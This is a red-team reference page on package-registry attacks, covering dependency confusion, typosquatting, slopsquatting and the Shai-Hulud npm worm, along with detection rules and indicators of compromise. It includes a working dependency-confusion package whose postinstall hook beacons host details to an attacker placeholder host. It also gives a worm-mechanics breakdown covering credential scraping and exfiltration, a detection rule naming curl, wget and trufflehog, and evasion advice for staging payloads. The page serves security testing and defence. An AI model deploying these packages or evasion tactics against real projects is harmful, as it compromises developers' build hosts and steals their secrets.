# Package Registry Attacks: Confusion, Typo/Slopsquatting & Worms

ATT&CK: T1195.002 (Compromise Software Supply Chain), T1059 (Command/Script execution at install) ·
CWE-427 (Uncontrolled Search Path / namespace resolution), CWE-829 (Inclusion of Functionality from
Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check).

## Theory / Mechanism

The build host runs `npm install` / `pip install` / `mvn`, which fetches and may **execute** code
(install hooks) with the developer's or CI's privileges. Four delivery vectors:

1. **Dependency confusion (CWE-427).** A resolver configured to consult both a private index and the
   public registry will, by default, prefer the **higher version number** regardless of source. An
   attacker publishes a public package with the *same name* as a private internal package at a very
   high version (e.g. `99.9.9`); CI pulls the attacker's package. Classic case: pytorch `torchtriton`.
2. **Typosquatting (CWE-829).** Publish a lookalike name (`requets`→`requests`, `colorama-py`,
   `selemium`); a typo or copy-paste installs it. PyPI removes hundreds/month.
3. **Slopsquatting (2025 variant, CWE-829).** LLM coding assistants hallucinate plausible but
   non-existent package names; attackers pre-register those names. Coined by Seth Larson. ConfuGuard
   (2025) confirmed 630 real package-confusion attacks in production registries.
4. **Account/maintainer takeover -> install-hook payload + worm.** A stolen npm token lets the
   attacker publish a malicious version of a *legitimate* popular package; an `install`/`postinstall`
   hook executes on every consumer's build host. If the payload also steals tokens and re-publishes,
   it becomes a self-replicating **worm** (Shai-Hulud, 2025).

## Working offensive techniques (authorized red-team)

### A. Find dependency-confusion candidates in a target's manifests
```bash
python3 scripts/dependency_confusion.py --manifest ./repo/package.json --registry npm
python3 scripts/dependency_confusion.py --manifest ./repo/requirements.txt --registry pypi
# Prints names referenced by the project that are NOT present on the public registry (404) =>
# claimable; or present but with a much lower public version => high-version-shadow candidate.
```

### B. Minimal dependency-confusion package (npm)
```json
// package.json — name MUST equal the target's internal package; version unusually high
{
  "name": "acme-internal-auth",
  "version": "99.0.0",
  "scripts": { "postinstall": "node ./hook.js" }
}
```
```js
// hook.js — benign beacon for an authorized POV; record host, cwd, env keys (NOT values)
const os=require('os'),https=require('https');
const beacon={h:os.hostname(),u:os.userInfo().username,cwd:process.cwd(),
  pkg:process.env.npm_package_name,envKeys:Object.keys(process.env)};
const data=Buffer.from(JSON.stringify(beacon)).toString('base64');
const r=https.request('https://OOB.attacker.tld/dc',{method:'POST'});r.write(data);r.end();
```
PyPI equivalent: a `setup.py` whose `cmdclass` runs the beacon during `install`. Keep payloads to a
proof beacon in authorized POVs; do not exfiltrate real secret values.

### C. Defensive enumeration of install hooks in a tree (use before trusting a lockfile)
```bash
# List packages declaring install-time hooks (npm) — these run code on `npm install`
npm query ":attr(scripts, [preinstall]), :attr(scripts, [install]), :attr(scripts, [postinstall])" 2>/dev/null
# or block them entirely in CI:
npm ci --ignore-scripts
```

## Modern 2024-2026 incidents (verified)

- **Shai-Hulud npm worm (Sep 2025) and Shai-Hulud 2.0 / "Sha1-Hulud" (Nov 2025).** Self-replicating
  worm; the second wave hit **25,000+ repositories** and 1,700+ package versions. Mechanics:
  - Payload: a ~3.6 MB minified **`bundle.js`** delivered via a hijacked npm **`postinstall`** script.
    Reported SHA-256: `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`.
  - Credential harvest: runs **`trufflehog filesystem / --json`** (via `child_process.exec`) to scrape
    GitHub PATs, AWS keys (`AKIA[0-9A-Z]{16}`), GCP/Azure creds, and npm tokens from disk + cloud
    metadata.
  - Self-replication: `NpmModule.updatePackage` queries the npm registry for up to **20 packages**
    owned by the compromised maintainer and force-publishes patched versions carrying `bundle.js`.
  - Exfiltration: stolen creds aggregated to JSON and pushed to **new public GitHub repos named
    `Shai-Hulud`** (`/user/repos`); a malicious **`.github/workflows/shai-hulud-workflow.yml`** is
    injected that exfiltrates `${{ toJSON(secrets) }}` (double-base64) to a `webhook.site` URL; a
    branch `refs/heads/shai-hulud` is created and force-merged across the maintainer's repos.
  - Targeting: Linux/macOS only (`os.platform() === 'linux' || 'darwin'`), skips Windows.
- **GhostAction (Sep 2025).** 327 accounts -> 817 repos -> 3,325 secrets (npm/PyPI/DockerHub/AWS)
  POSTed to attacker endpoints via injected workflows (see secrets-oidc-abuse.md).
- **Slopsquatting / ConfuGuard (2025).** AI-hallucinated dependency names weaponized; 630 confirmed
  confusion attacks measured in production registries.

## Detection

**EDR / Sigma — install hook spawning a network or secret-scanning child (worm signature):**
```yaml
title: Package Install Hook Spawns Credential Scanner Or Network Exfil
id: 9a2c0b7e-4f31-4ad2-bb90-cicdpkg0001
logsource: { category: process_creation }
detection:
  sel_parent:
    ParentImage|endswith: ['/npm', '/node', '/pip', '/python3']
  sel_bad:
    - Image|endswith: ['/trufflehog', '/curl', '/wget', '/git']
    - CommandLine|contains: ['trufflehog filesystem', '/user/repos', 'webhook.site', 'shai-hulud']
  condition: sel_parent and sel_bad
level: critical
```

**Repo / workflow IOCs:** files `bundle.js` (~3.6 MB, SHA-256 above) in `node_modules` postinstall
context; `.github/workflows/shai-hulud-workflow.yml`; branch/ref `shai-hulud`; new public repo named
`Shai-Hulud`; outbound to `webhook.site`. Dependency-confusion IOCs: an internal package name
resolving to a public registry; an install-time package version far above the prior pinned version.

**Build gate:** `npm ci --ignore-scripts` (block install hooks); enforce a single resolver index;
register internal names as public stubs; quarantine new packages (Socket.dev / JFrog Curation /
Snyk) for a cooling period.

## OPSEC

- Touches: the build host FS and egress at install time; the public registry (a published malicious
  version is permanent and timestamped); for worms, the maintainer's GitHub (new repos/branches/
  workflows) and the victim's secret store. A published package version is **non-deletable evidence**.
- Cleanup: you cannot unpublish silently (npm restricts unpublish; the version + timestamp remain).
- Evasion: keep the install hook tiny and benign-looking, stage the real payload from an OOB host,
  prefer dependency confusion (no human typo needed) over typosquatting; scope-confusion (`@org/name`)
  is harder than flat-name confusion. Worming is maximally loud — it burns the maintainer token and
  triggers registry takedowns within hours; only justified for impact demonstration in a sanctioned POV.

## References

- StepSecurity, "Shai-Hulud: Self-Replicating Worm Compromises 500+ NPM Packages" and follow-ups.
- Datadog Security Labs, "The Shai-Hulud 2.0 npm worm: analysis, and what you need to know."
- Unit 42 (Palo Alto), "Shai-Hulud Worm Compromises npm Ecosystem in Supply Chain Attack."
- The Hacker News, "Second Sha1-Hulud Wave Affects 25,000+ Repositories via npm Preinstall Credential Theft."
- GitGuardian, "Typosquatting and Dependency Confusion Attacks"; Rescana on slopsquatting; ConfuGuard (2025).
- Filippo Valsorda, "A Retrospective Survey of 2024/2025 Open Source Supply Chain Compromises."
